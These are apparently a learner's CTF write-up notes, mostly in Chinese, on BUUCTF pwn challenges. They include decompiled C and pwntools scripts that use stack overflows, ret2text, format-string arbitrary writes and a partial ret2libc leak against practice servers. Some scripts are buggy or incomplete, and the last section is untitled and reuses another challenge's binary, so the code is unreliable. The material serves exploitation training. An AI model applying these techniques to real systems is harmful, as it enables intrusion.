# buuctf-pwn




.. note::

   This .  ss





## warmup_csaw_2016



```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[64]; // [rsp+0h] [rbp-80h] BYREF
  char v5[64]; // [rsp+40h] [rbp-40h] BYREF

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(s, "%p\n", sub_40060D);
  write(1, s, 9uLL);
  write(1, ">", 1uLL);
  return gets(v5);
}
```



```python
from pwn import *

sh = remote('node4.buuoj.cn', 25891)
sh.sendline("A"*(0x40+8)+p64(0x40060D))
sh.interactive()
```





## ciscn_2019_n_1



+ amd64-64-little、NX
+ 考察点：
  + 十六进制的存储
  + ret2text覆盖返回地址



```c
int func()
{
  char v1[44]; // [rsp+0h] [rbp-30h] BYREF
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    return system("cat /flag");
  else
    return puts("Its value should be 11.28125");
}
```





(一)栈溢出写入浮点数

浮点数的小数点表示法是直观的表现形式，实际在计算机中以十六进制（二进制）的指定形式表示。

+ 十进制浮点数 => 二进制形式 => 十六进制形式

由于涉及到判断是否相等的操作，那么11.28125的十六进制形式也会在程序中存储。

> ```c
> 11.28125 转换为二进制为 1011.01001
> 11.28125 在计算机内部储存为 0100 0001 0011 0100 1000 0000 0000 0000
> 即11.28125 ==> 0x41348000
> ```



（二）栈溢出写入返回地址

让gets函数直接返回到system(cat flag)代码处，跳过if条件判断。

```python
from pwn import *
r=remote("node4.buuoj.cn",28863)

ret_arr = 0x4006BE
float_num = 0x41348000 
payload1 = 'a'*(0x30 - 0x4) + p64(float_num) 
payload2 = 'a'*(0x30 + 8) + p64(ret_arr)
p.sendline(payload1)
p.interactive()
```





## pwn1_sctf_2016 [源码没有读懂]





fgets看似限制了输入字符数为32，但后面存在字符替换操作。每单个字符`I`都会被替换为三个字符`You` 。而变量s的大小为60，可以输入20个`I`，替换后就得到了60个字符，利用栈溢出覆盖ebp和返回地址为get_flag函数。





```c
int vuln()
{
  const char *v0; // eax
  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF
  char v3[4]; // [esp+3Ch] [ebp-1Ch] BYREF
  char v4[7]; // [esp+40h] [ebp-18h] BYREF
  char v5; // [esp+47h] [ebp-11h] BYREF
  char v6[7]; // [esp+48h] [ebp-10h] BYREF
  char v7[5]; // [esp+4Fh] [ebp-9h] BYREF

  printf("Tell me something about yourself: ");
  fgets(s, 32, edata);
  std::string::operator=(&input, s);
  std::allocator<char>::allocator(&v5);
  std::string::string(v4, "you", &v5);
  std::allocator<char>::allocator(v7);
  std::string::string(v6, "I", v7);
  replace((std::string *)v3);
  std::string::operator=(&input, v3, v6, v4);
  std::string::~string(v3);
  std::string::~string(v6);
  std::allocator<char>::~allocator(v7);
  std::string::~string(v4);
  std::allocator<char>::~allocator(&v5);
  v0 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(s, v0);
  return printf("So, %s\n", s);
}
```



![在这里插入图片描述](https://img-blog.csdnimg.cn/01117078187747439192eab955af9598.png)



```
from pwn import *
r=remote("node4.buuoj.cn",25145)
#0x3c=60 
#every "I" will be replaced into "you", need 60/3=20 I
r.sendline("I"*20+"B"*4+p32(0x08048F0D))
r.interactive()
```







## jarvisoj_level0





```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  write(1, "Hello, World\n", 0xDuLL);
  return vulnerable_function();
}
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200uLL);
}
int callsystem()
{
  return system("/bin/sh");
}
```





```
from pwn import *
r=remote("node4.buuoj.cn",25007)
backdoor=0x400596
r.sendline("A"*(0x80+8)+p64(backdoor))
r.interactive()
```



## [第五空间2019 决赛]PWN5



+ Canary
+ i386-32-little
+ NX



num_addr=0x804C044 	#4字节

p32(num_addr)+"%10$n"

输入字符串的内容所在地址，相对格式化字符串所在地址的偏移为第10个参数



思路：

+ 格式化字符串漏洞任意地址写入，覆盖read的返回地址为system执行地址
+ 修改num的大小



**【疑问】为什么要写入四字节的数据**

![img](https://img-blog.csdnimg.cn/1bb32ec175a6481fb888fe6ebae7e299.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATF9feQ==,size_19,color_FFFFFF,t_70,g_se,x_16)

```
#coding=utf-8
from pwn import *

p = remote('node4.buuoj.cn',28526)
addr = 0x0804C044
#地址，也就相当于可打印字符串，共16byte
payload = p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)
#开始将前面输出的字符个数输入到地址之中，hhn是单字节输入，其偏移为10
#%10$hhn就相当于读取栈偏移为10处的数据当做地址，然后将前面的字符数写入到地址之中
payload += "%10$hhn%11$hhn%12$hhn%13$hhn"
p.sendline(payload)
# 0x10101010  4 * len(p32()) = 0x10
p.sendline(str(0x10101010))
p.interactive()
```



+ fmtstr：任意地址写入，修改num的值

```
from pwn import *
sh = remote('node4.buuoj.cn',28526)
unk_804C044 = 0x804C044
payload = fmtstr_payload(10, {unk_804C044: 0x1})
sh.sendline(payload)
sh.sendline(str(0x1))
sh.interactive()
```



```
#coding=utf-8
from pwn import *

p = remote('node4.buuoj.cn',28526)
elf = ELF("5thspace2019pwn5")
atoi_got = elf.got["atoi"]
system_plt = elf.plt["system"]
payload = fmtstr_payload(10,{atoi_got:system_plt})
p.sendline(payload)
p.sendline("/bin/sh\x00")  #!
p.interactive()
```





## 

思路：利用gets栈溢出泄露puts函数内存地址，从而确定libc版本，得到system("/bin/sh")



为了绕过while循环退出条件`v0>=strlen(s)` ，可以构造"\0"字符截断，作为溢出padding的一部分。

![img](https://img-blog.csdnimg.cn/20210322184607848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTU1NjQ0MQ==,size_16,color_FFFFFF,t_70)



puts@plt(puts@got) -> main 

总结做题中的错误：

+ 忘记64位需要堆栈平衡，需要使用gadget来构造参数
+ 没有看懂程序执行逻辑，没有看到while循环中的语句，如果不截断字符将会一直进行循环。

```
from pwn import *

p = remote('node4.buuoj.cn',28526)
elf = ELF("5thspace2019pwn5")
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main_addr=elf.sym["main"]
p.sendline("1")
p.recvuntil("\n")
p.sendline("A"*(0x50+8)+p64(puts_plt)+p64(puts_got)+p64(main_addr))




```













































